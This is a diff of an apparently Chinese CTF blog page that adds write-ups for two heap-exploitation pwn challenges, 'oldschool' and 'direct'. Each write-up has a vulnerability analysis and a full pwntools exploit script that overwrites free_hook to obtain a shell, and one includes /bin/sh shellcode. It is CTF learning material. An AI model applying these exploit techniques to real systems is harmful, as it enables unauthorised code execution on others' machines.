@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    4.6k 字
+                    6.2k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      24 分钟
+                      32 分钟
                   </span>&nbsp;
                 
 
@@ -921,6 +921,262 @@ delete(2)
 sh.interactive()
 </code></pre>
 <p>exp 来自 haivk 大师傅。</p>
+<h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>给了源码，分析程序带来了很大的便利。<br>会发现很多地方对size大小验证不是很多，是负数也行，但是对此题的攻击，用途并不大。</p>
+<pre><code class="c"> g_ptr =  mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); </code></pre>
+<p>这里可以看到申请的mmap区，是可以进行执行的，可以考虑一下shellcode。</p>
+<h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><pre><code class="c">void mmap_edit(){
+    if(g_ptr == NULL){
+        printf(&quot;Mmap first!&quot;);
+        return;
+    }
+
+    unsigned value;
+    unsigned idx;
+    printf(&quot;Index: &quot;);
+    idx = get_int(); 
+
+    if(g_ptr + idx &lt; g_ptr &amp;&amp; (unsigned)(g_ptr + idx) &lt; ADDR_HIGH){
+        puts(&quot;Invalid idx&quot;);
+        return;
+    }
+
+    printf(&quot;Value: &quot;);
+
+    value = get_int(); 
+    g_ptr[idx] = value;
+}</code></pre>
+<p>可以看到其对<code>g_ptr + idx</code>的验证是很简单的，给足大的偏移，可以改到libc的。是一个数组溢出。</p>
+<h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1:"></a>思路1:</h4><ul>
+<li>先正常分配，泄漏出libc地址</li>
+<li>分配一下mmap，利用数组溢出，进行修改<code>malloc_hook</code>，为mmap的地址。</li>
+<li>在mmap的内存上填上shellcode</li>
+</ul>
+<h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2:"></a>思路2:</h4><ul>
+<li>先正常分配，泄漏出libc地址</li>
+<li>分配一下mmap，利用数组溢出，进行修改<code>free_hook</code>，为system。</li>
+<li>free 一个 带有<code>/bin/sh</code>的chunk即可</li>
+</ul>
+<p>这个更好点。</p>
+<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./pwn&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 1
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27411)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(idx,size):
+    sla(&#39;ice&#39;,&#39;1&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;ize&#39;,str(size))
+
+def edit(idx,data):
+    sla(&#39;ice&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sa(&#39;tent&#39;,str(data))
+
+def show(idx):
+    sla(&#39;ice&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+def free(idx):
+    sla(&#39;ice&#39;,&#39;4&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+def mmap_add(addr):
+    sla(&#39;ice&#39;,&#39;6&#39;)
+    sla(&#39;start&#39;,str(addr))
+
+def mmap_edit(idx,data):
+    sla(&#39;ice&#39;,&#39;7&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;lue&#39;,str(data))
+
+for i in range(8):
+    add(i,0x90)
+add(9,0x10)
+for i in range(7):
+    free(i)
+free(7)
+add(10,0x10)
+show(10)
+ru(&#39;ent: &#39;)
+libc_base = uu32(r(4)) - 0x1d8828
+info_addr(&#39;libc&#39;,libc_base)
+system = 0x3d200 + libc_base
+free_hook = 0x1d98d0 + libc_base
+
+
+mmap_add(0)
+&#39;&#39;&#39;
+# one way
+offset = ((libc_base+0x1d8788 - 0xe0000000)) / 4
+mmap_edit(offset,&#39;3758096384&#39;)
+
+shellcode = &#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;
+
+shellcode = [int(0xd231c931),int(0x2f2f6852),int(0x2f686873),int(0x896e6962),int(0xb0c031e3),int(0x80cd0b)]
+
+for i in range(len(shellcode)):
+    mmap_edit(i,shellcode[i])
+
+add(13,0x10)
+&#39;&#39;&#39;
+# two way
+
+offset = ((free_hook - 0xe0000000)) / 4
+mmap_edit(offset,int(system))
+edit(9,&#39;/bin/sh\x00&#39; + &#39;\n&#39;)
+free(9)
+itr()</code></pre>
+<h2 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><ul>
+<li><p>申请的chunk最大值为0x100,max为16个</p>
+</li>
+<li><p>size可以为负值</p>
+<h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4></li>
+<li><p>offset, size 都可以为负值</p>
+</li>
+<li><p><code>read(0, (void *)(heaplist[idx] + offset), nbytes);</code> 这里存在负溢出，可以修改上一个chunk里面的值</p>
+</li>
+</ul>
+<h4 id="open-file函数"><a href="#open-file函数" class="headerlink" title="open file函数"></a>open file函数</h4><ul>
+<li>只能调用一次，调用后可以进行edit chunk</li>
+</ul>
+<h4 id="close-函数"><a href="#close-函数" class="headerlink" title="close 函数"></a>close 函数</h4><pre><code class="c">result = (ssize_t)readdir(dirp);
+    v1 = result;
+    if ( result )
+    {
+      put(&quot;Filename: &quot;);
+      result = put2(v1 + 0x13);</code></pre>
+<p>进行打印文件名。</p>
+<p>可以看到漏洞点就是在edit那里，且没有show函数。leak libc是此题的难点。因为是没有puts函数进行输出，所以攻击stdout也没有用。</p>
+<p><strong>重点是了解opendir 和 readdir。</strong><br>参考链接：<br><a href="https://blog.csdn.net/cainiao000001/article/details/80988738" target="_blank" rel="noopener">https://blog.csdn.net/cainiao000001/article/details/80988738</a></p>
+<p>可以发现，在调用opendir和readdir后，文件名是存在于内存中的。然后因为程序的写法，会直接输出一下<code>.</code>的文件名，再次调用会输出<code>..</code>的文件名，也是<code>0x13</code>的偏移处。那么想办法溢出修改这附近的内存，在打印文件名的时候，把libc地址也给印出来。</p>
+<h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
+<li>先申请8个堆，然后释放完，让其存在一个在unsortbin的chunk，且留出一个准备上溢出攻击的chunk</li>
+<li>openfile一下，在heap上申请一个巨大的chunk</li>
+<li>上溢出攻击，把加入unsortbin的chunk的size给修改大一点,覆盖到上面那个巨大的chunk，且这个巨大堆的next chunk的prev size 要填上合适的大小，绕过对unsortbin 的检查。</li>
+<li>close一下，会在刚刚巨大的chunk中留下dirent结构体，其中会包含filename</li>
+<li>申请堆到<code>..</code>这个文件名的附近，因为是unsortbin，会在其下面留下libc地址，准备泄漏（这个要注意，尽量不要破坏dirent结构体的数据，破坏后容易无法输出filename）</li>
+<li>上溢攻击<code>..</code>的文件名，给其修改其他合适的名字，泄漏出libc地址</li>
+<li>剩下的就简单了，上溢攻击tcache chain，修改为free hook</li>
+<li>攻击free hook 为one gadget</li>
+</ul>
+<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./pwn&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 1
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27411)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(idx,size):
+    sla(&#39;ice&#39;,&#39;1&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;ize&#39;,str(size))
+
+def edit(idx,offset,size,data):
+    sla(&#39;ice&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;set&#39;,str(offset))
+    sla(&#39;ize&#39;,str(size))
+    sa(&#39;tent&#39;,str(data))
+def free(idx):
+    sla(&#39;ice&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+def openfile():
+    sla(&#39;ice&#39;,&#39;4&#39;)
+
+def closefile():
+    sla(&#39;ice&#39;,&#39;5&#39;)
+for i in range(8):
+    add(i,0x100)
+
+add(8,0x18)
+
+for i in range(7):
+    free(i)
+openfile()
+
+add(9,0x18)
+add(0,0x18)
+free(7)
+data = p64(0) + p64(0x8040 + 0x20 + 0x110)
+edit(8,-0x120,0x100,data)
+data = p64(0x8170) + p64(0x20)
+edit(0,-0x30,0x18,data)
+closefile()
+add(1,0x90)
+add(2,0x70)
+add(3,0x60)
+data = p64(0x121111111111)[:6]
+print(data)
+edit(0,-0x7fd8-0x30+2,0x8,data)
+closefile()
+ru(&#39;\x12&#39;)
+libc_base = uu64(r(6)) - 0x3ebca0
+info_addr(&#39;libc_base&#39;,libc_base)
+
+
+data = p64(0x000000000000)[:6]
+edit(0,-0x7fd8-0x30+2,0x8,data)
+free_hook = 0x3ed8e8 + libc_base
+one = 0x4f322 + libc_base
+data = &#39;1&#39; * 8
+edit(0,-0x82a0,8,p64(free_hook))
+add(4,0x100)
+add(5,0x100)
+edit(5,0,8,p64(one))
+free(4)
+# debug()
+itr()</code></pre>
 
             <hr>
           </div>
